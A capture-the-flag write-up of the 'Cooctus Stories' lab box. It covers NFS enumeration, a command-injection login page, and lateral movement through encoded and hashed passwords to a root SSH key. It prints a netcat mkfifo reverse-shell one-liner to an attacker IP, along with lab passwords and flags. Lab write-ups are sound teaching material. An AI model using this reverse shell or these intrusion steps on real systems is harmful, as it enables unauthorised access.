> Cooctus Stories

# Rustscan

rustscan -a $IP --ulimit=5000 --batch-size 4500 -- -sC -sV -Pn -A | tee rustscan.log


```
22/tcp    open     ssh        syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp   open     rpcbind    syn-ack     2-4 (RPC #100000)
2049/tcp  filtered nfs        no-response
8080/tcp  filtered http-proxy no-response
34805/tcp open     mountd     syn-ack     1-3 (RPC #100005)
35325/tcp open     mountd     syn-ack     1-3 (RPC #100005)
43279/tcp open     nlockmgr   syn-ack     1-4 (RPC #100021)
57137/tcp open     mountd     syn-ack     1-3 (RPC #100005)
```

# Enumeration

## Port 2049 - NFS

Actually port 8080 got my eyes but then I thought about nfs and without further ado let's enumerate him.

showmount -e $IP //List shares

```
Export list for 10.10.99.185:
/var/nfs/general *
```

mkdir /mnt/Cooctus
mount -t nfs 10.10.99.185:/var/nfs/general /mnt/Cooctus

Wow!!💫We got a file named `credentials.bak`. 

```
paradoxial.test
ShibaPretzel79
```

Looks like a passwor for something! but what for? So I started enumerating port 8080.

# Port 8080 - Dirb

dirb http://$IP

```
+ http://10.10.99.185:8080/cat (CODE:302|SIZE:219)
```

And we got a login page. Really `Cookieless Login`. And as I slap in those credentials I am in another page, where looks like I can run some payload **safely**. Hmm! Maybe we can find a 🐛.

Looks like we can inject HTML payloads. But looks like I can execute commands to (had to refer writeups).

So I tried a reverse shell and we got a shell!!

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.107.21 1234 >/tmp/f`

We are in as `paradox`.

# user.txt

```
THM{2dccd1ab3e03990aea77359831c85ca2}
```

On investigating further I checked /etc/crontab and found something interesting!✨

`-rwxrwxr-- 1 szymex szymex 735 Feb 20 20:30 /home/szymex/SniffingCat.py`

## SniffingCat.py

```
with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr": => looks like we got his password
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)
```

But they are encoded. `cipher='pureelpbxr' ; for i in {0..25}; do echo $cipher | caesar $i; done`

We got a hit!! `cherrycoke`. Now we are in `szymex`.

# user.txt

```
THM{c89f9f4ef264e22001f9a9c3d72992ef}
```

## note_to_para 

```
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.
(Looks like this message is related to the python file.)
- Szymex
```

But then looking at `.bashrc` we got something interesting.

```
# Super cheeky hidey hide function
function ls (){
	        command ls "$@" -I tuxling_3;
	}
```

## note_to_every_cooctus 

```
Hello fellow Cooctus Clan members

I'm proposing my idea to dedicate a portion of the cooctus fund for the construction of a penguin army.

The 1st Tuxling Infantry will provide young and brave penguins with opportunities to
explore the world while making sure our control over every continent spreads accordingly.

Potential candidates will be chosen from a select few who successfully complete all 3 Tuxling Trials.
Work on the challenges is already underway thanks to the trio of my top-most explorers.

Required budget: 2,348,123 Doge coins and 47 pennies.

Hope this message finds all of you well and spiky.

- TuxTheXplorer
```

## /home/tux/tuxling_1/note

```
Noot noot! You found me. 
I'm Mr. Skipper and this is my challenge for you.

General Tux has bestowed the first fragment of his secret key to me.
If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.

Good luck and keep on nooting!

PS: You can compile the source code with gcc
```

## nootcode.c 

```
#include <stdio.h>

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT "f96"
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT "NOOT!\n"
#define nooOT "050a"
#define noOT printf
#define nOOT 0
#define nOoOoT "What does the penguin say?\n"
#define nout "d61"

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt
```

Looks like there are fragments of the hash `f96050ad61`. Let's move onto the next one. Looks like tuxling_1 is owned by testers group. So we can find some files who belonged to the same group.

find / -type f -group testers -ls 2>/dev/null

```
   791869      4 -rwxrwx---   1 tux      testers       178 Feb 20 21:02 /home/tux/tuxling_3/note
   655541      4 -rw-rw----   1 tux      testers       610 Jan  2 20:00 /home/tux/tuxling_1/nootcode.c
   657698      4 -rw-rw----   1 tux      testers       326 Feb 20 16:28 /home/tux/tuxling_1/note
   655450      4 -rw-rw-r--   1 tux      testers      3670 Feb 20 20:01 /media/tuxling_2/private.key
   655545      4 -rw-rw----   1 tux      testers       280 Jan  2 20:20 /media/tuxling_2/note
   655463      4 -rw-rw-r--   1 tux      testers       740 Feb 20 20:00 /media/tuxling_2/fragment.asc
```

## /home/tux/tuxling_3/note

``` 
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station.
```

## /media/tuxling_2/note

``` 
Noot noot! You found me. 
I'm Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I've encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!
```

So, I got the 2 files `fragment.asc` and `private.key` by setting up a python server. Let's use gpg to import the .key file.

1. gpg --import private.key
2. gpg fragment.asc 

And a new file names `fragment` is created.

```
The second key fragment is: 6eaf62818d
```

Looks like md5 hash `f96050ad616eaf62818d637b56db1552`. And on cracking it I got `tuxykitty`. I am in as `tux`🔥.

# user.txt

```
THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}
```

# Priv-Esc

sudo -l

```
User tux may run the following commands on cchq:
    (varg) NOPASSWD: /home/varg/CooctOS.py
```

Looks like in varg's home we can find .git dir in `cooctOS_src/`. And it has 1 commit.

git show

```
-print("CooctOS 13.3.7 LTS cookie tty1")
-uname = input("\ncookie login: ")
-pw = input("Password: ")
-
-for i in range(0,2):
-    if pw != "slowroastpork":
-        pw = input("Password: ")
-    else:
-        if uname == "varg":
-            os.setuid(1002)
-            os.setgid(1002)
-            pty.spawn("/bin/rbash")
-            break
-        else:
-            print("Login Failed")
-            break
```

Looks like Cooctus.py file. And we have a password. Looks like the python file asks for username where we have to enter username `varg` and a specific password and we are given a restricted bash(rbash). But let's try the same to su as varg.

# user.txt

```
THM{3a33063a4a8a5805d17aa411a53286e6}
```

# Priv-Esc

sudo -l

```
User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount
```

Hmm nothing in GTFO bins. Typing `mount` we can find a directory called `/opt/CooctFS` which is mounted. And now I used umount to unmount `/opt/CooctFS`. We got a `root` directory but `root.txt` containts nothing and I saw an interesting file `id_rsa`. Let's slap it in my system and try to ssh in as root!!

# root.txt

```
THM{H4CK3D_BY_C00CTUS_CL4N}
```